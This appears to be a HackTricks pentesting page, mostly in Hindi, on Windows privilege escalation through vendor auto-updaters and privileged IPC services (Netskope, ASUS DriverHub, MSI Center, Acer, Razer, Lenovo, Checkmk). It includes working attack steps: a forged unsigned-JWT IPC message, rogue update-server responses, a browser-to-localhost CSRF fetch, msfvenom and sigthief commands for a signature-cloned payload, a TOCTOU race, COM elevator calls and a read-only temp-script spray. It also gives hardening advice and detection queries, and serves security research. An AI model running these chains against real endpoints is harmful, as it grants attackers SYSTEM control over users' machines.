# Enterprise Auto-Updaters और Privileged IPC का दुरुपयोग (जैसे Netskope, ASUS और MSI)

{{#include ../../banners/hacktricks-training.md}}

यह पेज enterprise endpoint agents और updaters में पाई जाने वाली Windows local privilege escalation chains की एक श्रेणी को सामान्य रूप में प्रस्तुत करता है। ये agents और updaters ऐसा सरल IPC surface और privileged update flow expose करते हैं। इसका एक प्रतिनिधि उदाहरण R129 से पुराने Windows के लिए Netskope Client (CVE-2025-0309) है, जिसमें low-privileged user attacker-controlled server में enrollment को बाध्य कर सकता है और फिर एक malicious MSI भेज सकता है, जिसे SYSTEM service install करती है।<sup>[[1]](#references)[[2]](#references)[[5]](#references)</sup>

ऐसे ही products के विरुद्ध पुनः उपयोग किए जा सकने वाले मुख्य विचार:
- Privileged service के localhost IPC का दुरुपयोग करके re-enrollment या reconfiguration को attacker server की ओर बाध्य करें।
- Vendor के update endpoints को implement करें, एक rogue Trusted Root CA प्रदान करें, और updater को malicious, “signed” package की ओर point करें।
- कमजोर signer checks (CN allow-lists), optional digest flags और lax MSI properties से बच निकलें।
- यदि IPC “encrypted” है, तो registry में stored world-readable machine identifiers से key/IV derive करें।
- यदि service callers को image path/process name के आधार पर प्रतिबंधित करती है, तो किसी allow-listed process में inject करें या किसी process को suspended अवस्था में spawn करके minimal thread-context patch के माध्यम से अपनी DLL bootstrap करें।

---
## 1) localhost IPC के माध्यम से attacker server में enrollment को बाध्य करना

कई agents एक user-mode UI process के साथ ship होते हैं, जो JSON का उपयोग करके localhost TCP के माध्यम से SYSTEM service से बात करता है।

Netskope में observed:
- UI: stAgentUI (low integrity) ↔ Service: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Exploit flow:
1) ऐसा JWT enrollment token तैयार करें, जिसके claims backend host (जैसे AddonUrl) को नियंत्रित करें। `alg=None` का उपयोग करें, ताकि signature की आवश्यकता न हो।
2) अपने JWT और tenant name के साथ provisioning command invoke करने वाला IPC message भेजें:
```json
{
"148": {
"idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
"tenantName": "TestOrg"
}
}
```
3) Enrollment/config के लिए service आपके rogue server को request भेजना शुरू करती है, जैसे:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Notes:
- यदि caller verification path/name-based है, तो request को allow-listed vendor binary से originate करें (देखें §4)।<sup>[[1]](#references)[[2]](#references)</sup>

---
## 2) SYSTEM के रूप में code चलाने के लिए update channel को hijack करना

जब client आपके server से communicate करने लगे, तो अपेक्षित endpoints implement करें और उसे attacker MSI की ओर निर्देशित करें। सामान्य sequence:

1) /v2/config/org/clientconfig → बहुत छोटा updater interval वाला JSON config return करें, जैसे:
```json
{
"clientUpdate": { "updateIntervalInMin": 1 },
"check_msi_digest": false
}
```
2) /config/ca/cert → एक PEM CA certificate लौटाएँ। Service इसे Local Machine Trusted Root store में install करती है।
3) /v2/checkupdate → एक malicious MSI और fake version की ओर संकेत करने वाला metadata दें।

Wild में दिखने वाले सामान्य checks को bypass करना:
- Signer CN allow-list: service केवल यह check कर सकती है कि Subject CN “netSkope Inc” या “Netskope, Inc.” के बराबर है। आपका rogue CA इस CN वाला leaf issue कर सकता है और MSI को sign कर सकता है।
- CERT_DIGEST property: CERT_DIGEST नाम वाली एक benign MSI property शामिल करें। Install के समय कोई enforcement नहीं होता।
- Optional digest enforcement: config flag (जैसे, check_msi_digest=false) अतिरिक्त cryptographic validation को disable कर देता है।

Result: SYSTEM service आपके MSI को
C:\ProgramData\Netskope\stAgent\data\*.msi
से install करती है और arbitrary code को NT AUTHORITY\SYSTEM के रूप में execute करती है।<sup>[[1]](#references)[[2]](#references)</sup>

Patch-bypass lesson: यदि कोई vendor update source को cryptographically authenticate करने के बजाय “trusted” domains की एक छोटी set को allow-list करके प्रतिक्रिया देता है, तो vendor-owned redirectors या reverse proxies खोजें, जो अब भी आपको traffic steer करने देते हैं। Netskope के मामले में, public follow-up research ने दिखाया कि R129-era allow-list को `rproxy.goskope.com` के माध्यम से अब भी abuse किया जा सकता था, जो attacker-controlled Azure App Service content को proxy करता था। Hostname allow-lists को trust boundary के बजाय speed bump समझें।<sup>[[14]](#references)</sup>

---
## 3) Encrypted IPC requests को forge करना (जब present हो)

R127 से Netskope ने IPC JSON को एक encryptData field में wrap किया, जो Base64 जैसा दिखता है। Reversing से पता चला कि AES का key/IV ऐसे registry values से derive होता है, जिन्हें कोई भी user पढ़ सकता है:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Attackers encryption को reproduce कर सकते हैं और standard user से valid encrypted commands भेज सकते हैं।<sup>[[1]](#references)[[2]](#references)</sup> General tip: यदि कोई agent अचानक अपने IPC को “encrypt” करता है, तो HKLM के अंतर्गत device IDs, product GUIDs और install IDs को material के रूप में खोजें।

---
## 4) IPC caller allow-lists को bypass करना (path/name checks)

कुछ services TCP connection के PID को resolve करके और image path/name की तुलना Program Files के अंतर्गत स्थित allow-listed vendor binaries (जैसे, stagentui.exe, bwansvc.exe, epdlp.exe) से करके peer को authenticate करने का प्रयास करती हैं।

दो practical bypasses:
- किसी allow-listed process (जैसे, nsdiag.exe) में DLL injection करें और उसके अंदर से IPC proxy करें।
- किसी allow-listed binary को suspended अवस्था में spawn करें और CreateRemoteThread के बिना अपनी proxy DLL bootstrap करें (देखें §5), ताकि driver-enforced tamper rules संतुष्ट हों।<sup>[[1]](#references)[[2]](#references)</sup>

---
## 5) Tamper-protection friendly injection: suspended process + NtContinue patch

Products अक्सर protected processes के handles से dangerous rights हटाने के लिए minifilter/OB callbacks driver (जैसे, Stadrv) ship करते हैं:
- Process: PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME को हटाता है
- Thread: केवल THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE तक सीमित करता है

एक reliable user-mode loader जो इन constraints का पालन करता है:
1) CREATE_SUSPENDED के साथ किसी vendor binary का CreateProcess करें।
2) वे handles प्राप्त करें जिनकी आपको अब भी अनुमति है: process पर PROCESS_VM_WRITE | PROCESS_VM_OPERATION, और THREAD_GET_CONTEXT/THREAD_SET_CONTEXT वाला thread handle (या केवल THREAD_RESUME, यदि आप known RIP पर code patch करते हैं)।
3) ntdll!NtContinue (या किसी अन्य early, guaranteed-mapped thunk) को एक छोटे stub से overwrite करें, जो आपकी DLL path पर LoadLibraryW call करता है, फिर वापस jump करता है।
4) In-process आपके stub को trigger करने और आपकी DLL load करने के लिए ResumeThread करें।

क्योंकि आपने किसी पहले से protected process पर PROCESS_CREATE_THREAD या PROCESS_SUSPEND_RESUME का उपयोग नहीं किया (आपने उसे create किया था), driver की policy संतुष्ट रहती है।<sup>[[1]](#references)[[2]](#references)</sup>

---
## 6) Practical tooling
- NachoVPN (Netskope plugin) rogue CA, malicious MSI signing और आवश्यक endpoints को serve करने की प्रक्रिया automate करता है: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate।<sup>[[3]](#references)</sup>
- UpSkope एक custom IPC client है, जो arbitrary (वैकल्पिक रूप से AES-encrypted) IPC messages तैयार करता है और suspended-process injection को शामिल करता है, ताकि messages किसी allow-listed binary से originate हों।<sup>[[4]](#references)</sup>

## 7) Unknown updater/IPC surfaces के लिए Fast triage workflow

जब किसी नए endpoint agent या motherboard “helper” suite का सामना हो, तो एक quick workflow आमतौर पर यह बताने के लिए पर्याप्त होता है कि आप किसी promising privesc target को देख रहे हैं या नहीं:<sup>[[6]](#references)</sup>

1) Loopback listeners enumerate करें और उन्हें vendor processes से map करें:
```powershell
Get-NetTCPConnection -State Listen |
Where-Object {$_.LocalAddress -in @('127.0.0.1', '::1', '0.0.0.0', '::')} |
Select-Object LocalAddress,LocalPort,OwningProcess,
@{n='Process';e={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Path}}
```
2) Candidate named pipes की enumeration:
```powershell
[System.IO.Directory]::GetFiles("\\.\pipe\") | Select-String -Pattern 'asus|msi|razer|acer|agent|update'
```
3) plugin-based IPC servers द्वारा उपयोग किए जाने वाले registry-backed routing data को निकालें:
```powershell
Get-ChildItem 'HKLM:\SOFTWARE\WOW6432Node\MSI\MSI Center\Component' |
Select-Object PSChildName
```
4) पहले user-mode client से endpoint names, JSON keys और command IDs निकालें। Packed Electron/.NET frontends अक्सर पूरा schema leak कर देते हैं:
```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.js','C:\Program Files\Vendor\**\*.dll' `
-Pattern '127.0.0.1|localhost|UpdateApp|checkupdate|NamedPipe|LaunchProcess|Origin'
```
5) वास्तविक trust predicate खोजें, केवल उस code path को नहीं जो अंततः process launch करता है:
```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.exe','C:\Program Files\Vendor\**\*.dll','C:\Program Files\Vendor\**\*.js' `
-Pattern 'WinVerifyTrust|CryptQueryObject|Origin|Referer|Subject|CN=|ExecuteTask|LaunchProcess|CreateProcessAsUser'
```
प्राथमिकता देने योग्य patterns:
- `CryptQueryObject`/certificate parsing के बिना `WinVerifyTrust` आमतौर पर इसका संकेत है कि “certificate मौजूद है” को “certificate trusted है” मान लिया गया, जिससे certificate cloning या अन्य fake-signer tricks संभव हो जाती हैं।
- `Origin`, `Referer`, download URLs, process names या signer CNs पर substring/suffix checks authentication नहीं हैं। `contains(".vendor.com")` आमतौर पर attacker-controlled lookalike domains के साथ exploitable होता है।
- यदि low-privileged GUI यह तय करता है कि “file trusted है” और SYSTEM broker केवल उस परिणाम का उपयोग करता है, तो client-side DLL/JS को patch या reimplement करने से पूरी boundary bypass हो सकती है (Razer-style split validation)।
- यदि broker किसी payload को `%TEMP%`/`C:\Windows\Temp` में copy करके फिर उसी path से validate या schedule करता है, तो तुरंत TOCTOU replacement windows और उन sibling plugin modules की जांच करें जो कमजोर checks वाले वैकल्पिक `ExecuteTask()` wrappers expose करते हैं।<sup>[[6]](#references)</sup>

Named-pipe-heavy targets के लिए, protocol को गहराई से reverse करना शुरू करने से पहले कमजोर DACLs और remotely reachable pipes पहचानने का PipeViewer एक तेज़ तरीका है।<sup>[[11]](#references)</sup>

यदि target callers को केवल PID, image path या process name से authenticate करता है, तो इसे boundary के बजाय speed bump मानें: legitimate client में inject करना या allow-listed process से connection बनाना अक्सर server के checks को संतुष्ट करने के लिए पर्याप्त होता है। Named pipes के लिए विशेष रूप से, [client impersonation और pipe abuse पर यह page](named-pipe-client-impersonation.md) इस primitive को अधिक विस्तार से समझाता है।

---
## 8) केवल vendor signatures से authenticated modular add-in brokers (Lenovo Vantage pattern)

एक नया variation जिसका शिकार करना उपयोगी है, **signed-client RPC broker** है: low-privileged Lenovo-signed desktop process SYSTEM service से बात करता है, और service JSON commands को `%ProgramData%` के अंतर्गत XML-described add-ins के समूह में route करता है। जैसे ही किसी accepted signed client **के अंदर** code execution प्राप्त होता है, प्रत्येक `runas="system"` contract आपके attack surface का हिस्सा बन जाता है।<sup>[[15]](#references)</sup>

Lenovo Vantage research में देखे गए high-value primitives:
- **Caller पर भरोसा करना क्योंकि वह vendor द्वारा signed है**: researchers ने एक Lenovo-signed EXE को writable directory में copy करके और DLL side-load (`profapi.dll`) को संतुष्ट करके authenticated context प्राप्त किया, जिससे service द्वारा पहले से trusted client के अंदर arbitrary code चला।
- **Manifest-driven attack surface discovery**: add-ins को `C:\ProgramData\Lenovo\Vantage\Addins\*.xml` के अंतर्गत declare किया जाता है; कई contracts `SYSTEM` के रूप में चलते हैं, इसलिए उन manifests को enumerate करने से broker को स्वयं reverse करने की तुलना में वास्तविक privileged verbs अक्सर जल्दी मिल जाते हैं।
- **Authenticated channel के पीछे per-command bugs**: trusted client के अंदर पहुंचने के बाद, public research में update/install verbs में path-traversal + race conditions, privileged settings databases में raw-SQL abuse और substring-based registry path checks मिले, जिनसे intended hive के बाहर writes संभव हुईं।

Target पर उपयोगी recon:
```powershell
Get-ChildItem "$env:ProgramData\Lenovo\Vantage\Addins" -Filter *.xml |
Select-String -Pattern 'runas="system"|<name>|<namespace>'
```

```powershell
Select-String -Path 'C:\Program Files\Lenovo\**\*.dll','C:\Program Files\Lenovo\**\*.exe' `
-Pattern 'contract|command|payload|DeleteTable|DeleteSetting|Set-KeyChildren|DownloadAndInstallAppComponent|InstallOnly'
```
Practical takeaway: जब भी कोई helper suite ऐसा broker expose करे जो पहले **caller process** को authenticate करता है और उसके बाद ही दर्जनों plugin/add-in commands को dispatch करता है, तो केवल front-door trust check को bypass करने के बाद रुकें नहीं। manifest/contract table को dump करें और प्रत्येक high-privilege verb को स्वतंत्र रूप से fuzz करें; authenticated channel आमतौर पर कई second-stage bugs छिपाता है।

---
## 1) Privileged HTTP APIs (ASUS DriverHub) के विरुद्ध Browser-to-localhost CSRF

DriverHub एक user-mode HTTP service (ADU.exe) को 127.0.0.1:53000 पर चलाता है, जो https://driverhub.asus.com से आने वाली browser calls की अपेक्षा करता है। Origin filter, Origin header और `/asus/v1.0/*` द्वारा expose किए गए download URLs पर केवल `string_contains(".asus.com")` perform करता है। इसलिए `https://driverhub.asus.com.attacker.tld` जैसा कोई भी attacker-controlled host check पास कर लेता है और JavaScript से state-changing requests भेज सकता है।<sup>[[6]](#references)</sup> अतिरिक्त bypass patterns के लिए [CSRF basics](../../pentesting-web/csrf-cross-site-request-forgery.md) देखें।

Practical flow:
1) ऐसा domain register करें जिसमें `.asus.com` शामिल हो और वहां एक malicious webpage host करें।
2) `fetch` या XHR का उपयोग करके `http://127.0.0.1:53000` पर किसी privileged endpoint (जैसे `Reboot`, `UpdateApp`) को call करें।
3) Handler द्वारा अपेक्षित JSON body भेजें – packed frontend JS नीचे schema दिखाता है।
```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
method: "POST",
headers: { "Content-Type": "application/json" },
body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```
नीचे दिखाया गया PowerShell CLI भी तब सफल होता है जब Origin header को trusted value पर spoof किया जाता है:
```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
-Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
-Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```
इसलिए attacker site पर किसी भी browser visit से 1-click (या `onload` के माध्यम से 0-click) local CSRF होता है, जो SYSTEM helper को संचालित करता है।

---
## 2) असुरक्षित code-signing verification और certificate cloning (ASUS UpdateApp)

`/asus/v1.0/UpdateApp` JSON body में परिभाषित arbitrary executables को download करता है और उन्हें `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp` में cache करता है। Download URL validation उसी substring logic का पुनः उपयोग करता है, इसलिए `http://updates.asus.com.attacker.tld:8000/payload.exe` स्वीकार कर लिया जाता है। Download के बाद, ADU.exe केवल यह जाँचता है कि PE में signature मौजूद है और Subject string ASUS से match करती है, फिर उसे run कर देता है – कोई `WinVerifyTrust` या chain validation नहीं होती।

इस flow को weaponize करने के लिए:
1) एक payload बनाएँ (जैसे, `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`)।
2) उसमें ASUS के signer को clone करें (जैसे, `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`)।
3) `pwn.exe` को `.asus.com` lookalike domain पर host करें और ऊपर दिए गए browser CSRF के माध्यम से UpdateApp को trigger करें।

क्योंकि Origin और URL दोनों filters substring-based हैं और signer check केवल strings की तुलना करता है, DriverHub attacker binary को अपने elevated context में pull और execute कर देता है।<sup>[[6]](#references)</sup>

---
## 1) updater copy/execute paths के अंदर TOCTOU (MSI Center CMD_AutoUpdateSDK)

MSI Center की SYSTEM service एक TCP protocol expose करती है, जिसमें प्रत्येक frame `4-byte ComponentID || 8-byte CommandID || ASCII arguments` होता है। Core component (Component ID `0f 27 00 00`) `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}` को ship करता है। इसका handler:
1) दिए गए executable को `C:\Windows\Temp\MSI Center SDK.exe` में copy करता है।
2) `CS_CommonAPI.EX_CA::Verify` के माध्यम से signature verify करता है (certificate subject “MICRO-STAR INTERNATIONAL CO., LTD.” के बराबर होना चाहिए और `WinVerifyTrust` सफल होना चाहिए)।
3) एक scheduled task बनाता है, जो temp file को attacker-controlled arguments के साथ SYSTEM के रूप में run करता है।

Verification और `ExecuteTask()` के बीच copied file lock नहीं होती। एक attacker:
- Frame A भेज सकता है, जो किसी legitimate MSI-signed binary की ओर point करता है (इससे signature check सफल होना और task queue होना सुनिश्चित होता है)।
- इसे repeated Frame B messages के साथ race कर सकता है, जो malicious payload की ओर point करते हैं और verification पूरी होने के तुरंत बाद `MSI Center SDK.exe` को overwrite कर देते हैं।

जब scheduler trigger होता है, तो वह original file को validate किए जाने के बावजूद overwritten payload को SYSTEM के अंतर्गत execute करता है। Reliable exploitation के लिए दो goroutines/threads का उपयोग किया जाता है, जो TOCTOU window जीतने तक CMD_AutoUpdateSDK को spam करते हैं।<sup>[[6]](#references)</sup>

---
## 2) custom SYSTEM-level IPC और impersonation का Abusing (MSI Center + Acer Control Centre)

### MSI Center TCP command sets
- `MSI.CentralServer.exe` द्वारा load किए गए प्रत्येक plugin/DLL को `HKLM\SOFTWARE\MSI\MSI_CentralServer` के अंतर्गत stored Component ID मिलता है। Frame के पहले 4 bytes उस component को select करते हैं, जिससे attackers commands को arbitrary modules तक route कर सकते हैं।
- Plugins अपने task runners define कर सकते हैं। `Support\API_Support.dll` `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` expose करता है और बिना किसी signature validation के सीधे `API_Support.EX_Task::ExecuteTask()` call करता है – कोई भी local user इसे `C:\Users\<user>\Desktop\payload.exe` पर point करके deterministically SYSTEM execution प्राप्त कर सकता है।
- Wireshark से loopback sniff करना या dnSpy में .NET binaries को instrument करना Component ↔ command mapping को जल्दी reveal करता है; इसके बाद custom Go/ Python clients frames को replay कर सकते हैं।<sup>[[6]](#references)</sup>

### Acer Control Centre named pipes और impersonation levels
- `ACCSvc.exe` (SYSTEM) `\\.\pipe\treadstone_service_LightMode` expose करता है, और इसका discretionary ACL remote clients (जैसे, `\\TARGET\pipe\treadstone_service_LightMode`) को अनुमति देता है। File path के साथ command ID `7` भेजने पर service का process-spawning routine invoke होता है।
- Client library arguments के साथ एक magic terminator byte (113) serialize करती है। Frida/`TsDotNetLib` के साथ dynamic instrumentation ([Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md) में instrumentation tips देखें) दिखाता है कि native handler `CreateProcessAsUser` call करने से पहले इस value को `SECURITY_IMPERSONATION_LEVEL` और integrity SID में map करता है।
- 113 (`0x71`) को 114 (`0x72`) से बदलने पर generic branch में प्रवेश होता है, जो full SYSTEM token को बनाए रखता है और high-integrity SID (`S-1-16-12288`) set करता है। इसलिए spawned binary unrestricted SYSTEM के रूप में, local और cross-machine दोनों स्थितियों में, run होती है।
- इसे exposed installer flag (`Setup.exe -nocheck`) के साथ combine करके lab VMs पर भी ACC स्थापित करें और vendor hardware के बिना pipe को exercise करें।<sup>[[6]](#references)</sup>

ये IPC bugs बताते हैं कि localhost services को mutual authentication (ALPC SIDs, `ImpersonationLevel=Impersonation` filters, token filtering) क्यों enforce करना चाहिए और प्रत्येक module के “run arbitrary binary” helper को समान signer verifications क्यों साझा करनी चाहिए।

---
## 3) कमजोर user-mode validation द्वारा समर्थित COM/IPC “elevator” helpers (Razer Synapse 4)

Razer Synapse 4 ने इस family में एक और उपयोगी pattern जोड़ा: low-privileged user `RzUtility.Elevator` के माध्यम से process launch करने के लिए COM helper से request कर सकता है, जबकि trust decision privileged boundary के अंदर robustly enforce होने के बजाय user-mode DLL (`simple_service.dll`) को delegate किया जाता है।

Observed exploitation path:
- COM object `RzUtility.Elevator` को instantiate करें।
- Elevated launch request करने के लिए `LaunchProcessNoWait(<path>, "", 1)` call करें।
- Public PoC में request जारी करने से पहले `simple_service.dll` के अंदर PE-signature gate को patch out कर दिया जाता है, जिससे attacker-chosen arbitrary executable launch हो सकता है।<sup>[[6]](#references)</sup>

Minimal PowerShell invocation:
```powershell
$com = New-Object -ComObject 'RzUtility.Elevator'
$com.LaunchProcessNoWait("C:\Users\Public\payload.exe", "", 1)
```
सामान्य निष्कर्ष: “helper” suites को reverse करते समय केवल localhost TCP या named pipes तक सीमित न रहें। `Elevator`, `Launcher`, `Updater`, या `Utility` जैसे नामों वाली COM classes की जाँच करें, फिर सत्यापित करें कि privileged service वास्तव में target binary को स्वयं validate करती है या केवल patch की जा सकने वाली user-mode client DLL द्वारा computed result पर भरोसा करती है। यह pattern Razer से आगे भी लागू होता है: कोई भी split design, जिसमें high-privilege broker low-privilege side से allow/deny decision प्राप्त करता है, संभावित privesc surface है।


---
## MSI repair के दौरान Predictable temp script execution (Checkmk Agent / CVE-2024-0670)

कुछ Windows agents अभी भी privileged actions को `C:\Windows\Temp` में एक temporary `.cmd` लिखकर और उसे `SYSTEM` के रूप में execute करके लागू करते हैं। यदि filename predictable हो और service मौजूदा files को सुरक्षित रूप से recreate न करे, तो low-privileged user भविष्य की temp file को **read-only** के रूप में पहले से बना सकता है और privileged process को अपनी script के बजाय attacker-controlled content execute करने के लिए मजबूर कर सकता है।

Vulnerable Checkmk Agent builds में देखा गया:
- temp pattern: `cmk_all_<PID>_1.cmd`
- affected branches: `2.0.0`, `2.1.0`, `2.2.0`
- trigger: cached agent package का MSI **repair**<sup>[[8]](#references)[[9]](#references)</sup>

Practical workflow:
1. वर्तमान process IDs या running agent PID से एक realistic PID range का अनुमान लगाएँ।
2. एक छोटी **ASCII** `.cmd` payload लिखें (`Set-Content -Encoding Ascii` या `cmd.exe` redirection का उपयोग करें; batch files के लिए UTF-16 PowerShell output से बचें)।
3. Candidate range में `C:\Windows\Temp\cmk_all_<PID>_1.cmd` को spray करें और प्रत्येक file को read-only के रूप में mark करें।
4. Cached MSI का repair trigger करें, ताकि privileged service temp script को फिर से generate करने का प्रयास करे और उसके बाद उसे execute करे।<sup>[[7]](#references)</sup>
```powershell
Set-Content -Path C:\ProgramData\payload.cmd -Encoding Ascii -Value "@echo off`nwhoami > C:\ProgramData\proof.txt"
1..10000 | ForEach-Object {
Copy-Item C:\ProgramData\payload.cmd "C:\Windows\Temp\cmk_all_${_}_1.cmd"
Set-ItemProperty "C:\Windows\Temp\cmk_all_${_}_1.cmd" -Name IsReadOnly -Value $true
}
```
यदि vulnerable product को Windows Installer के साथ install किया गया है, तो repair trigger करने से पहले `C:\Windows\Installer` के अंतर्गत random-looking cached MSI को उसके product name से map करें:<sup>[[7]](#references)</sup>
```powershell
Get-ChildItem "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\*\InstallProperties" |
ForEach-Object {
$p = Get-ItemProperty $_.PSPath
[PSCustomObject]@{Name=$p.DisplayName; Pkg=$p.LocalPackage}
} | Where-Object Name -like "*Check MK Agent*"

msiexec /fa C:\Windows\Installer\<cached-agent>.msi
```
Operational notes:
- `qwinsta` तब उपयोगी है जब non-interactive WinRM shell से `msiexec /fa` विफल हो जाए और आपको यह समझना हो कि कोई मौजूदा desktop/disconnected session repair को सही तरीके से trigger कर सकता है या नहीं।<sup>[[7]](#references)</sup>
- यह pattern अन्य endpoint agents और updaters पर भी लागू होता है, जो **world-writable locations में temp scripts stage करते हैं और बाद में उन्हें SYSTEM के रूप में execute करते हैं**। Predictable names, missing exclusive create semantics और on-demand trigger किए जा सकने वाले repair/update flows की जांच करें।

---
## कमजोर updater validation के माध्यम से Remote supply-chain hijack (WinGUp / Notepad++)

June 2025 और December 2025 के बीच, Notepad++ update flow के पीछे की hosting infrastructure से compromise करने वाले attackers ने चुने हुए victims को selectively malicious manifests serve किए। पुराने WinGUp-based updaters update authenticity को पूरी तरह verify नहीं करते थे, इसलिए hostile XML response clients को attacker-controlled URLs पर redirect कर सकता था। चूंकि client ने downloaded installer पर trusted certificate chain और valid PE signature दोनों enforce किए बिना HTTPS content स्वीकार किया, victims ने trojanized NSIS `update.exe` fetch और execute किया।<sup>[[12]](#references)[[13]](#references)</sup>

Operational flow (किसी local exploit की आवश्यकता नहीं):
1. **Infrastructure interception**: CDN/hosting को compromise करें और malicious download URL की ओर संकेत करने वाले attacker metadata के साथ update checks का उत्तर दें।
2. **Trojanized NSIS**: installer payload fetch/execute करता है और दो execution chains का abuse करता है:
- **Bring-your-own signed binary + sideload**: signed Bitdefender `BluetoothService.exe` को bundle करें और उसके search path में malicious `log.dll` रखें। जब signed binary चलता है, Windows `log.dll` को sideload करता है, जो Chrysalis backdoor को decrypt और reflectively load करता है (static detection को कठिन बनाने के लिए Warbird-protected + API hashing)।
- **Scripted shellcode injection**: NSIS एक compiled Lua script execute करता है, जो shellcode inject करने और Cobalt Strike Beacon stage करने के लिए Win32 APIs (जैसे `EnumWindowStationsW`) का उपयोग करती है।<sup>[[12]](#references)</sup>

किसी भी auto-updater के लिए Hardening/detection takeaways:
- Downloaded installer का **certificate + signature verification** enforce करें (vendor signer को pin करें, mismatched CN/chain को reject करें) और update manifest को स्वयं sign करें (जैसे XMLDSig)। Validation के बिना manifest-controlled redirects को block करें।
- **BYO signed binary sideloading** को post-download detection pivot मानें: जब कोई signed vendor EXE अपने canonical install path के बाहर से DLL name load करे (जैसे Bitdefender का Temp/Downloads से `log.dll` load करना), और जब कोई updater temp से non-vendor signatures वाले installers drop/execute करे, तो alert करें।
- इस chain में देखे गए **malware-specific artifacts** को monitor करें (generic pivots के रूप में उपयोगी): mutex `Global\Jdhfv_1.0.1`, `%TEMP%` में anomalous `gup.exe` writes और Lua-driven shellcode injection stages।
- Notepad++ ने v8.8.9 और बाद के versions में WinGUp को मजबूत किया: लौटाया गया XML अब signed (XMLDSig) है और newer builds transport पर अकेले भरोसा करने के बजाय downloaded installer का certificate + signature verification enforce करते हैं।<sup>[[13]](#references)</sup>

<details>
<summary>Cortex XDR XQL – Bitdefender-signed EXE sideloading <code>log.dll</code> (T1574.001)</summary>
```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```
</details>

<details>
<summary>Cortex XDR XQL – <code>gup.exe</code> ऐसे installer को लॉन्च कर रहा है जो Notepad++ का नहीं है</summary>
```sql
config case_sensitive = false
| dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```
</details>

ये patterns ऐसे किसी भी updater पर लागू होते हैं जो unsigned manifests स्वीकार करता है या installer signers को pin करने में विफल रहता है—network hijack + malicious installer + BYO-signed sideloading के परिणामस्वरूप “trusted” updates की आड़ में remote code execution प्राप्त किया जा सकता है।

---
## संदर्भ
- [1] [Advisory – Netskope Client for Windows – Rogue Server के माध्यम से Local Privilege Escalation (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [2] [Netskope Security Advisory NSKPSA-2025-002](https://www.netskope.com/resources/netskope-resources/netskope-security-advisory-nskpsa-2025-002)
- [3] [NachoVPN – Netskope plugin](https://github.com/AmberWolfCyber/NachoVPN)
- [4] [UpSkope – Netskope IPC client/exploit](https://github.com/AmberWolfCyber/UpSkope)
- [5] [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [6] [SensePost – ASUS DriverHub, MSI Center, Acer Control Centre और Razer Synapse 4 को Pwning करना](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [7] [0xdf – HTB: NanoCorp](https://0xdf.gitlab.io/2026/06/20/htb-nanocorp.html)
- [8] [SEC Consult – Checkmk Agent में writable files के माध्यम से Local Privilege Escalation](https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-writable-files-in-checkmk-agent/)
- [9] [Checkmk Werk #16361 – Windows agent में Privilege escalation](https://checkmk.com/werk/16361)
- [10] [sensepost/bloatware-pwn PoCs](https://github.com/sensepost/bloatware-pwn)
- [11] [CyberArk PipeViewer](https://github.com/cyberark/PipeViewer)
- [12] [Unit 42 – Nation-State Actors द्वारा Notepad++ Supply Chain का Exploit](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
